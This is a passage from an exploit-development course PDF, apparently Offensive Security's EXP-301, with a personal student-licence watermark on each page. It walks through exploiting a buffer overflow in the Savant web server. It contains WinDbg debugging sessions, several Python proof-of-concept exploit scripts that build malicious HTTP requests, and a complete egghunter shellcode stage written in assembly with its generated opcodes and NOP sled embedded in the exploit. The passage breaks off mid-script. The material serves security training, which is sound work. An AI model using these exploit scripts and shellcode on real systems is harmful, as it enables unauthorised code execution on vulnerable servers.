EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
179 
eip=02feea88 esp=02feea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02feea88 0f8411000000    je      02feea9f                                [br=1] 
 
0:003> t 
eax=02fefe70 ebx=01565750 ecx=00000000 edx=77d94550 esi=01565750 edi=0041703c 
eip=02feea9f esp=02feea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02feea9f 41              inc     ecx 
 
0:003> u @eip 
02feea9f 41              inc     ecx 
02feeaa0 41              inc     ecx 
02feeaa1 41              inc     ecx 
02feeaa2 41              inc     ecx 
02feeaa3 41              inc     ecx 
02feeaa4 41              inc     ecx 
02feeaa5 41              inc     ecx 
02feeaa6 41              inc     ecx 
Listing 202 - Taking the conditional jump and landing in our buffer 
Now that we have set the instruction pointer to the beginning of our buffer, we can attempt to 
replace it with shellcode. Because of the size of our buffer, our choices of Metasploit Framework 
shellcodes are limited. 
0:003> db @eip L100 
02feea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA 
02feeaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA 
... 
02feeb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA 
02feeb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00  AAAAAAAAAAAt.A.. 
0:003> ? 02feeb8f + 0n11 - @eip 
Evaluate expression: 251 = 000000fb 
Listing 203 - Calculating the available size for the shellcode 
While generating a reverse shell payload in previous modules, the size of the resulting shellcode 
was over 300 bytes. A more advanced payload, such as a Meterpreter, would require even more 
space. 
Even if we were to use the HTTP method buffer, rather than jumping over it, we would still not 
have enough space for a large payload. 
While it is possible to use a smaller payload, we would like to avoid such a limitation if possible. 
Let’s try to a find way to store a larger shellcode in our current exploit. 
6.4.4.1 Exercises 
1. 
Go over the references and theory discussed in this section and get familiar with what 
conditional jumps are available in the assembly language. 
2. 
Try to understand how the XOR and TEST assembly operations work and why they are used 
to satisfy the condition for our jump. 
3. 
Can you use a different conditional jump that does not rely on the ZF? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
180 
4. 
After redirecting the execution flow to our buffer, use the WinDbg evaluation command (?) to 
calculate the available space for our shellcode. What payloads would fit in this space? 
6.5 Finding Alternative Places to Store Large Buffers 
Generally, when we have limited space for our payload, there are two options that we can pursue. 
The first one is to use a smaller payload that provides fewer features. This is usually a last resort, 
and one we would only use if we could not find other methods of using a larger payload. The 
second option, which we are going to explore, is to find a way to store an additional buffer in a 
different memory region before the crash and then redirect the execution flow to that additional 
buffer. 
In other words, if we can store a second, larger buffer elsewhere, we can use our current, smaller 
buffer space to write a stage one shellcode. The purpose of this shellcode would be to redirect the 
execution flow to that second buffer, where we will have more space to store a larger payload. 
To determine what will be stored in memory by our vulnerable application, we could either 
perform a very in-depth reverse engineering process on the application, which is out of the scope 
of this module, or we could make some educated guesses based on the type of application we 
are attacking. 
Because we are attacking a web server, our initial thought was that rather than terminating the 
HTTP request, we could add an additional buffer after the first carriage return (\r) and new-line 
(\n) as shown below: 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n" 
  httpEndRequest+= b"w00tw00t" + b"\x44" * 400 
  httpEndRequest+= b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 204 - egghunter_0x0a.py: Attempting to store an additional buffer before ending the HTTP request 
In Listing 204, we have updated our proof of concept with an additional buffer before terminating 
the HTTP request. We have also added a unique ASCII string (w00tw00t) before our buffer of 
0x44 characters. This will help us locate the buffer in memory using WinDbg’s search function. 
Running the proof of concept does not seem to cause our application to crash, which means this 
method will not work here. 
In our next attempt, we will try to send the buffer after we end our HTTP request. Once again, we’ll 
use a unique ASCII string at the beginning of our buffer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
181 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  shellcode = b"w00tw00t" + b"\x44" * 400 
 
  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode 
... 
Listing 205 - egghunter_0x0b.py: Attempting to store an additional buffer after the HTTP request 
When we run this updated proof of concept against our vulnerable software, we hit the breakpoint 
at our POP EAX; RET instruction sequence. Next, we attempt to find our unique ASCII string in 
memory using the s command. 
Breakpoint 0 hit 
eax=00000000 ebx=013656a8 ecx=0000000e edx=77284550 esi=013656a8 edi=0041703c 
eip=00418674 esp=016cea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
 
0:003> s -a 0x0 L?80000000 w00tw00t 
01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD 
 
0:003> db 01365a5e + 0n408 - 4 L4 
01365bf2  44 44 44 44                                      DDDD 
Listing 206 - Finding our secondary buffer in memory 
Listing 206 shows that we can find a single copy of our secondary buffer stored in memory, 
which is ideal. Based on the result of the db command, it also seems that we were able to store 
the entire buffer. This should be more than enough space for a more advanced payload like a 
reverse Meterpreter shell. 
Now that we can successfully store a larger secondary buffer, the next step will be to learn more 
about where this buffer is stored. 
6.5.1.1 Exercises 
1. 
Modify your proof of concept and store a secondary buffer in the vulnerable process 
memory. 
2. 
Once you hit your breakpoint, attempt to find the location of your secondary buffer inside 
WinDbg. 
3. 
Verify that your entire buffer is stored. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
182 
6.5.2 The Windows Heap Memory Manager 
In this section, we are going to investigate the memory address where our secondary buffer is 
stored. We will have a quick overview of what Heap155 memory is and how it is handled by the 
Windows operating system. 
A full explanation of the Windows Heap Memory Manager is beyond the scope of 
this course. We will only cover the basics of it. This summary is very introductory 
and barely scratches the surface of this mechanism. 
Once we find our buffer in memory (0x01365a5e), we will inspect the memory address to 
determine in which region it is located and its properties. 
0:003> !teb 
TEB at 7ffdb000 
    ExceptionList:        016cff70 
    StackBase:            016d0000 
    StackLimit:           016cc000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
    ArbitraryUserPointer: 00000000 
    Self:                 7ffdb000 
    EnvironmentPointer:   00000000 
    ClientId:             00001400 . 00001548 
    RpcHandle:            00000000 
    Tls Storage:          0031f6d0 
    PEB Address:          7ffdf000 
    LastErrorValue:       0 
    LastStatusValue:      c000000d 
    Count Owned Locks:    0 
    HardErrorMode:        0 
Listing 207 - Checking the StackBase and StackLimit 
The first thing we notice is that the address is not located on our current stack. To obtain more 
information, we can use the !address156 extension from WinDbg, which allows us to display 
information about a specific memory address. 
0:003> !address 01365a5e   
 
Mapping file section regions... 
Mapping module regions... 
Mapping PEB regions... 
Mapping TEB and stack regions... 
Mapping heap regions... 
Mapping page heap regions... 
Mapping other regions... 
 
155 (Wikibooks - Windows Programming/Memory Subsystem, 2016), 
https://en.wikibooks.org/wiki/Windows_Programming/Memory_Subsystem 
156 (Microsoft - !address, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
183 
Mapping stack trace database regions... 
Mapping activation context regions... 
 
Usage:                  Heap 
Base Address:           01360000 
End Address:            0136f000 
Region Size:            0000f000 (  60.000 kB) 
State:                  00001000          MEM_COMMIT 
Protect:                00000004          PAGE_READWRITE 
Type:                   00020000          MEM_PRIVATE 
Allocation Base:        01360000 
Allocation Protect:     00000004          PAGE_READWRITE 
More info:              heap owning the address: !heap 0x1360000 
More info:              heap segment 
More info:              heap entry containing the address: !heap -x 0x1365a5e 
 
Content source: 1 (target), length: 5a2 
Listing 208 - Displaying information about the memory address where our buffer is stored 
According to the output from Listing 208, the memory address where our buffer is stored is on 
the heap. 
To understand what heap memory is, we need to first take a look at the Heap Manager. This is a 
software layer that resides on top of the virtual memory interfaces provided by the Windows 
operating system.157 
This software layer allows applications to dynamically request and release memory through a set 
of Windows APIs (VirtualAllocEx,158 VirtualFreeEx,159 HeapAlloc,160 and HeapFree161). These APIs 
will eventually call into their respective native functions in ntdll.dll (RtlAllocateHeap162 and 
RtlFreeHeap163). 
In Windows operating systems, when a process starts, the Heap Manager automatically creates a 
new heap called the default process heap. At a very high level, heaps are big chunks of memory 
that are divided into smaller pieces to fulfill dynamic memory allocation requests. 
Although some processes only use the default process heap, many will create additional heaps 
using the HeapCreate164 API (or its lower-level interface ntdll!RtlCreateHeap165) to isolate different 
components running in the process itself. 
 
157 (Practical Windows XP/2003 Heap Exploitation, 2009), http://illmatics.com/XP2003_Exploitation.pdf 
158 (Microsoft - VirtualAllocEx, 2018), https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-
virtualallocex 
159 (Microsoft - VirtualFreeEx, 2018), https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex 
160 (Microsoft - HeapAlloc, 2018), https://docs.microsoft.com/en-us/windows/desktop/api/HeapApi/nf-heapapi-heapalloc 
161 (Microsoft - HeapFree, 2018), https://docs.microsoft.com/en-gb/windows/desktop/api/heapapi/nf-heapapi-heapfree 
162 (Microsoft - RtlAllocateHeap, 2019), https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-
rtlallocateheap 
163 (Microsoft - RtlFreeHeap, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-
rtlfreeheap 
164 (Microsoft - HeapCreate, 2018), https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate 
165 (Microsoft - RtlCreateHeap, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-
rtlcreateheap 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
184 
Other processes make substantial use of the C Runtime heap166 for most dynamic allocations 
(malloc / free functions). These heap implementations, defined as NT Heap, eventually make use 
of the Windows Heap Manager functions in ntdll.dll to interface with the kernel Windows Virtual 
Memory Manager and to allocate memory dynamically. 
Because our secondary buffer is stored in dynamic memory, there’s no way to determine its 
location beforehand. This rules out the possibility of adding a static offset to our current 
instruction pointer to reach our secondary buffer. We will need to explore other methods of 
finding the location of our buffer. 
6.5.2.1 Exercises 
1. 
Use the !address WinDbg extension to determine that your secondary buffer is stored on 
the heap. 
2. 
Restart your debugging session and run the previous proof of concept several times, 
ensuring that the address of your buffer is not the same. 
6.6 Finding our Buffer - The Egghunter Approach 
When we need to find the memory address of another buffer under our control that is not static, 
we often use an Egghunter. This term refers to a small first-stage payload that can search the 
process virtual address space (VAS) for an egg, a unique tag that prepends the payload we want 
to execute. Once the egg is found, the egghunter transfers the execution to the final shellcode by 
jumping to the found address. One of the first implementations of this technique can be found in 
a paper written by Matt Miller167 in 2004. 
Since egghunters are often used when dealing with space restrictions, they are written to be as 
small as possible. Additionally, the speed of the egghunter is essential; the faster the egghunter 
finds the unique tag, the less time the application will hang. 
These type of payloads also need to be robust and handle access violations168 that are raised 
while scanning the virtual address space. The access violations usually occur while attempting to 
access an unmapped memory address or addresses we don’t have access to. 
In the past, we would typically write the assembly code for our egghunter and then proceed to 
compile the code. After, we would disassemble the compiled binary in software such as IDA to 
get the opcodes for it. 
As you can imagine, doing this for each change or mistake in our code can become tedious and 
time-consuming. Fortunately, we have a better alternative. 
 
166 (C/C++ Runtime heap), http://support.tenasys.com/INtimeHelp_62/ovw_heaps.html 
167 (Safely Searching Process Virtual Address Space), http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
168 While parsing the whole process memory space the Egghunter might encounter pages that are not even mapped or that we don’t 
have access to. This, of course, would trigger an access violation when the Egghuter code tries to dereference such a memory 
address. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
185 
6.6.1 Keystone Engine 
Writing shellcode is much more streamlined with a tool like Keystone Engine,169 which is an 
assembler framework with bindings for several languages, including Python. With it, we can 
simply write our ASM code in a Python script and let the Keystone framework do the rest. 
Before learning how Keystone works, we need to install it on our Kali machine. First, we install the 
python3-pip tool from the repositories. 
kali@kali:~$ sudo apt install python3-pip 
[sudo] password for kali:  
Reading package lists... Done 
... 
Setting up python3-wheel (0.34.2-1) ... 
Setting up python-pip-whl (20.1.1-2) ... 
Setting up python3-pip (20.1.1-2) ... 
Processing triggers for man-db (2.9.3-2) ... 
Processing triggers for kali-menu (2021.1.1) ... 
Listing 209 - Installing python3-pip on our Kali VM 
Once this is done, we will install the Keystone engine Python3 library using the pip command. 
kali@kali:~$ pip install keystone-engine 
... 
Installing collected packages: keystone-engine 
Successfully installed keystone-engine-0.9.2 
Listing 210 - Installing the Keystone Engine on our Kali VM 
With Keystone installed, let’s try to write a basic example to better understand how it works. For 
now, the purpose of our script will be to output the opcodes for various assembly instructions. 
from keystone import * 
 
CODE = ( 
"                        "  
" start:                 " 
"     xor eax, eax      ;"  
"     add eax, ecx      ;"  
"     push eax          ;"  
"     pop esi           ;"  
) 
 
# Initialize engine in 32-bit mode 
ks = Ks(KS_ARCH_X86, KS_MODE_32) 
encoding, count = ks.asm(CODE) 
instructions = "" 
for dec in encoding:  
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
   
print("Opcodes = (\"" + instructions + "\")") 
Listing 211 - keystone_0x01.py: Intro script using the Keystone Engine 
 
169 (Keystone Assembler Framework), http://www.keystone-engine.org 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
186 
Before running the script from Listing 211, let’s first understand what it does. We start by 
importing everything (*) from the keystone library. Next, we define the CODE variable, which 
contains the assembly start function followed by four assembly instructions. These are the 
instructions we wish to obtain the opcodes for. 
The next line initializes the Keystone Engine with the Ks class. This class accepts two arguments: 
the architecture we want to use (in this case x86) and the mode (in this case 32-bit). 
Using the ks variable, which is set to the Ks class, we can now invoke methods such as asm to 
compile the instructions. This method returns a list of the encoded bytes as well as the number of 
instructions that were assembled. 
The number of instructions assembled can help troubleshoot issues where no 
error is thrown even if a particular assembly instruction is not successfully 
assembled. 
We then enter a for loop that goes through each encoded byte and uses format string to store it 
as a Python-style shellcode in the instructions variable. The reason we fill it with zeroes for a 
width of two ({0:02x}) is to add the first 0 in a single hex digit opcode. Finally, we output the result. 
kali@kali:~$ python3 keystone_0x01.py 
Opcodes = ("\x31\xc0\x01\xc8\x50\x5e") 
Listing 212 - Outputting the opcodes from the assembled instructions 
The script appears to have run successfully and we received the opcodes as output. Let’s try to 
verify the opcodes generated in Listing 212 using msf-nasm_shell. 
kali@kali:~$ msf-nasm_shell  
 
nasm > xor eax,eax 
00000000  31C0              xor eax,eax 
 
nasm > add eax,ecx 
00000000  01C8              add eax,ecx 
 
nasm > push eax 
00000000  50                push eax 
 
nasm > pop esi 
00000000  5E                pop esi 
Listing 213 - Comparing the opcodes from our script with the ones from msf-nasm_shell 
Excellent! It appears that the opcodes match. The ability to simply edit the assembly instructions 
directly in a Python script will be a huge timesaver when writing custom assembly code. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
187 
 
Please note that while Keystone saves a large amount of time, it is not without 
fault. Depending on the assembly code we are working with, some opcodes, like 
short jumps, may not be generated correctly. We recommended going over the 
assembly instructions in memory to confirm that the generated opcodes are 
correct. 
Now that we have a basic idea of how Keystone works, we can discuss how our egghunter will 
work. Then we’ll write it in our Python script with the help of Keystone. 
6.6.1.1 Exercises 
1. 
Install Keystone on your Kali machine. 
2. 
Run the script presented in this section and confirm that the generated opcodes match the 
output from msf-nasm_shell. 
3. 
Go over the script and make sure you understand how it works. 
6.6.2 System Calls and Egghunters 
In order to learn more about how they work, in this section, we are going to examine one of the 
first egghunters released to the public. 
We’ll cover the main techniques used by the egghunter to find a secondary buffer and go through 
the important assembly instructions. 
As we mentioned earlier, an egghunter is a small first-stage payload that can search the process’s 
virtual address space (VAS) for an “egg”. It essentially crawls through the entire memory space of 
our vulnerable software. One of the issues egghunters must account for is the fact that there is 
no way of telling beforehand if a memory page is mapped, if it has the correct permissions to 
access it, or what kind of access is allowed on that memory page. If this is not handled correctly, 
we will generate an access violation and cause a crash. 
To combat this issue, the original author abused the NtAccessCheckAndAuditAlarm170 Windows 
system call. While going in-depth on how this function works is outside the scope of this course, 
what’s important to understand is that issuing this system call will almost always return a specific 
error code. The error code, STATUS_NO_IMPERSONATION_TOKEN171 (0xc000005c), is returned 
due to various checks made by the function before it attempts to use any of the provided 
arguments. 
 
170 (NTAPI Undocumented Functions - NtAccessCheckAndAuditAlarm), 
https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheck
AndAuditAlarm.html 
171 (Microsoft - NTSTATUS Values), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-
4972-9bbc-49e60bebca55 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
188 
 
NtAccessCheckAndAuditAlarm will work without issues in the egghunter unless 
we are running in the context of a thread that is impersonating a client.172 In 
these cases, it might not work as expected by our egghunter code. 
Because this egghunter abuses the NtAccessCheckAndAuditAlarm Windows system call, before 
going over the assembly code we need to understand what system calls are. To put it simply, a 
system call is an interface between a user-mode process and the kernel.173 
Invoking a system call is usually done through a dedicated assembly instruction or an interrupt174 
(also known as a trap or exception). Whenever this is done, the current software will signal the 
operating system and request an operation to be performed. At this point, the operating system 
takes over, performs the operation in the background, and then returns to the running software 
with the result of that operation. 
The egghunter takes full advantage of this. Rather than crawling the memory inside our program 
and risking an access violation, we’ll use a system call and have the operating system access a 
specific memory address. 
Before the desired function is called, the operating system will attempt to copy the arguments we 
provide in user-space, to kernel-space. If the memory address where the function arguments 
reside is not mapped, or if we don’t have the appropriate access, the copy operation will cause an 
access violation. 
The 
access 
violation 
will 
be 
handled 
in 
the 
background 
and 
then 
return 
a 
STATUS_ACCESS_VIOLATION175 code (0xc0000005), allowing our egghunter to continue to the 
next memory page.176 
Before invoking a system call, the operating system needs to know the function it should call and 
the arguments that are passed to it. On the x86 architecture, the function can be specified by 
setting up a unique System Call Number177 in the EAX register that matches a specific function. If 
the function is invoked through a system call, after pushing the arguments individually on the 
stack, we’ll move the stack pointer (ESP) to the EDX register, which is passed to the system call. 
As part of the system call, the operating system will try to access the memory address where the 
function arguments are stored. This is done in order to copy them from user-space to kernel-
space. As previously mentioned, if EDX points to an unmapped memory address or one we can’t 
access due to lack of appropriate permissions, the operating system will trigger an access 
violation, which it will handle for us and return the STATUS_ACCESS_VIOLATION code in EAX. 
 
172 (Microsoft - Client Impersonation), https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation 
173 (Wikipedia - Kernel), https://en.wikipedia.org/wiki/Kernel_(operating_system) 
174 (Wikipedia - Interrupt), https://en.wikipedia.org/wiki/Interrupt 
175 (Microsoft - NTSTATUS Values), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-
4972-9bbc-49e60bebca55 
176 The size of a memory page on x86 is 0x1000 hex bytes. 
177 A system call number is a unique integer that corresponts to a specific kernel (operating system) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
189 
Essentially, by using the NtAccessCheckAndAuditAlarm system call, we will only get two results 
back. If the memory page is valid and we have appropriate access, the system call will return 
STATUS_NO_IMPERSONATION_TOKEN. Attempting to access an unmapped memory page or one 
without appropriate access will result in a STATUS_ACCESS_VIOLATION code. The fact that there 
are only two possible return values for the system call is used by the egghunter assembly code as 
we will cover shortly. 
Now that we have a basic understanding of what mechanisms the egghunter technique abuses, 
let’s examine the code below and find out how to implement it. 
from keystone import * 
 
CODE = ( 
        # We use the edx register as a memory page counter 
"                            "  
"   loop_inc_page:           " 
        # Go to the last address in the memory page 
"       or dx, 0x0fff       ;"  
"   loop_inc_one:            " 
        # Increase the memory counter by one 
"       inc edx             ;" 
"   loop_check:              " 
        # Save the edx register which holds our memory  
        # address on the stack 
"       push edx            ;" 
        # Push the system call number 
"       push 0x2            ;"  
        # Initialize the call to NtAccessCheckAndAuditAlarm 
"       pop eax             ;"  
        # Perform the system call 
"       int 0x2e            ;"  
        # Check for access violation, 0xc0000005  
        # (ACCESS_VIOLATION) 
"       cmp al,05           ;"  
        # Restore the edx register to check later  
        # for our egg 
"       pop edx             ;"  
"   loop_check_valid:        " 
        # If access violation encountered, go to n 
        # ext page 
"       je loop_inc_page    ;"  
"   is_egg:                  " 
        # Load egg (w00t in this example) into  
        # the eax register 
"       mov eax, 0x74303077 ;"  
        # Initializes pointer with current checked  
        # address  
"       mov edi, edx        ;"  
        # Compare eax with doubleword at edi and  
        # set status flags 
"       scasd               ;"  
        # No match, we will increase our memory  
        # counter by one 
"       jnz loop_inc_one    ;"  
        # First part of the egg detected, check for  
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
190 
        # the second part 
"       scasd               ;"  
        # No match, we found just a location  
        # with half an egg 
"       jnz loop_inc_one    ;"  
"   matched:                 " 
        # The edi register points to the first  
        # byte of our buffer, we can jump to it 
"       jmp edi             ;"  
) 
 
# Initialize engine in 32bit mode 
ks = Ks(KS_ARCH_X86, KS_MODE_32) 
encoding, count = ks.asm(CODE) 
egghunter = "" 
for dec in encoding:  
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
   
print("egghunter = (\"" + egghunter + "\")") 
Listing 214 - original_egghunter.py: Keystone version of the original egghunter code 
Since the egghunter assembly code from Listing 214 can be quite daunting to inspect all at once, 
we will break it down into chunks. 
        # We use the edx register as a memory page counter 
"                            "  
"   loop_inc_page:           " 
        # Go to the last address in the memory page 
"       or dx, 0x0fff       ;"  
"   loop_inc_one:            " 
        # Increase the memory counter by one 
"       inc edx             ;" 
Listing 215 - Moving to the next memory page 
Our egghunter starts with an OR178 operation on the DX register. This operation will make EDX 
point to the last address of a memory page. This is followed by an INC179 instruction, which 
effectively sets EDX to a new memory page. 
Initially, it might seem that we could achieve this using a single assembly 
instruction such as AND EDX, 0xFFFFF000, but we also need to take possible null 
bytes generated by our instructions into account. 
Now that EDX contains the address of the next memory page, we’ll proceed to the loop_check 
function. 
"   loop_check:              " 
        # Save the edx register which holds our memory  
 
178 (OR - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_219.html 
179 (INC - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_140.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
191 
        # address on the stack 
"       push edx            ;" 
        # Push the system call number 
"       push 0x2            ;"  
        # Initialize the call to NtAccessCheckAndAuditAlarm 
"       pop eax             ;"  
        # Perform the system call 
"       int 0x2e            ;"  
Listing 216 - Performing the system call 
Before setting up our system call, we use a PUSH180 instruction to store the EDX register on the 
stack for later. 
While we don’t need the PUSH EDX instruction for the execution of the system 
call, we can’t guarantee that EDX will be restored at the end of the system call. 
Pushing it on the stack allows us to restore it later on. 
After storing EDX, we push the system call number (0x02) and then perform a POP181 instruction. 
This will pop the system call number from the stack into EAX. 
Now that we have the system call number in EAX and a fake pointer to our arguments in EDX, we 
can invoke the system call using a specific instruction, INT 0x2E,182 which results in a trap. 
Microsoft designed the operating system to treat this exception as a system call. 
At this point, the operating system will invoke the system call. As part of this, it will check the 
memory pointer from EDX to gather the function arguments. If accessing the memory address 
from EDX causes an access violation, we will get the STATUS_ACCESS_VIOLATION (0xc0000005) 
result in EAX. 
Our next code chunk will use the return value of the system call. 
        # Check for access violation, 0xc0000005  
        # (ACCESS_VIOLATION) 
"       cmp al,05           ;"  
        # Restore the edx register to check later  
        # for our egg 
"       pop edx             ;"  
"   loop_check_valid:        " 
        # If access violation encountered, go to n 
        # ext page 
"       je loop_inc_page    ;" 
Listing 217 - Verify if the memory page is valid 
To avoid null bytes, rather than checking for the entire DWORD, our egghunter simply performs a 
CMP183 between the AL register and the value 0x05. 
 
180 (PUSH - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_269.html 
181 (POP - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_248.html 
182 Windows Internals - System Service Dispatching 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
192 
The next instruction (POP EDX) will restore our memory address from the stack back into the EDX 
register. This is followed by a conditional jump based on the result of our previous comparison. If 
a STATUS_ACCESS_VIOLATION was found, we move on to the next memory page by jumping to 
the beginning of our egghunter and repeating the previous steps. 
If the memory page is mapped, or we have the appropriate access, we continue to check for our 
unique signature (egg) as shown in the listing below: 
"   is_egg:                  " 
        # Load egg (w00t in this example) into  
        # the eax register 
"       mov eax, 0x74303077 ;"  
        # Initializes pointer with current checked  
        # address  
"       mov edi, edx        ;"  
        # Compare eax with doubleword at edi and  
        # set status flags 
"       scasd               ;"  
        # No match, we will increase our memory  
        # counter by one 
"       jnz loop_inc_one    ;"  
Listing 218 - Check the first part of our egg 
Listing 218 shows our egghunter using a MOV184 instruction to move the hex value of our egg in 
EAX and move our memory address from EDX to EDI. The next instruction, SCASD,185 will 
compare the value stored in EAX with the first DWORD that the memory address from EDI is 
pointing to. Then it will automatically increment EDI by a DWORD. 
This SCASD instruction is followed by another conditional jump that is dependent on the result of 
the comparison. If the first DWORD of our egg is not found, then we jump back, increase the 
memory address by one, and repeat the process. If found, we use the SCASD instruction again to 
check for the second DWORD of our egg. 
        # First part of the egg detected, check for  
        # the second part 
"       scasd               ;"  
        # No match, we found just a location  
        # with half an egg 
"       jnz loop_inc_one    ;"  
"   matched:                 " 
        # The edi register points to the first  
        # byte of our buffer, we can jump to it 
"       jmp edi             ;"  
Listing 219 - Check the second part of our egg 
According to the assembly code, if the second entry matches, it means that we have found our 
buffer and EDI points right after our egg. From here, we can redirect the execution flow with a 
simple JMP instruction. 
 
183 (CMP - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_35.html 
184 (MOV - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_176.html 
185 (SCASD - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_287.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
193 
 
The original code from Matt Miller used the NtDisplayString186 system call, 
exploiting the very same concept. However, Miller realized that the use of the 
NtAccessCheckAndAuditAlarm system call was actually improving the portability 
of the egghunter. This is due to the fact that the NtAccessCheckAndAuditAlarm 
system call number (0x02) didn’t change across different operating systems 
versions, compared to the one for NtDisplayString. 
Now that we have reviewed the code, let’s execute the script and get the opcodes for our 
egghunter. 
kali@kali:~$ python3 original_egghunter.py 
egghunter = 
("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30
\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7") 
Listing 220 - Obtaining the opcodes for our egghunter 
With the opcodes generated, we can now include the egghunter in our proof of concept. Because 
our jump is not exact, we will prepend the egghunter with a NOP sled. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
 
  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled 
               b"\x66\x81\xca\xff\x0f\x42\x52\x6a" 
               b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
               b"\xef\xb8\x77\x30\x30\x74\x89\xd7" 
               b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7") 
 
  inputBuffer = b"\x41" * (size - len(egghunter)) 
